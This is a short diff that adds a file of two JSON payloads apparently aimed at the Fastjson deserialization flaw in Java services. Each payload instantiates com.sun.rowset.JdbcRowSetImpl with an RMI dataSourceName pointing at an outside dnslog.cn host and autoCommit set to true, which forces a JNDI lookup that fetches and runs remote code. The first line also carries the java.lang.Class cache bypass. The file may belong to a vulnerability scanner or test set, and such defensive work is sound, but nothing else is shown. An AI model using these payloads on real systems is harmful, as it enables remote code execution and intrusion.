@@ -1,0 +1,2 @@
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://yannjw.dnslog.cn/Exploit","autoCommit":true}}
+{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://yannjw.dnslog.cn/Exploit/Exploit","autoCommit":true}}
